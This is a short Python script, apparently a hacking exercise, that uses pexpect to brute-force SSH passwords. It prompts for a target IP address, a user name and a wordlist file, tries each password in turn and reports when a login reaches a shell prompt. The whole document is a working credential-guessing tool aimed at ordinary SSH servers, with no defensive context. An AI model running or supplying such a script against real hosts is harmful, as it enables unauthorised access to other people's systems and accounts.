#!/usr/bin/python
import pexpect

PROMPT = ['#', '>>>', '> ', '\$ ']


def connect(host, user, password):
    ssh_newKey = "Are you sure you want to continue "
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newKey, '[P|p]assword: '])
    if ret == 0:
        print('Connection Error')
    if ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print("Connection Error")
            return
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5)
    return child


def main():
    host = input("Enter IP Address: ")
    user = input("Enter user name: ")
    file = input("Enter password file: ")

    openfile = open(file, "r")

    for password in openfile.readlines():
        try:
            connect(host, user, password.strip("\n"))
            print("password found " + password)
        except:
            continue


main()
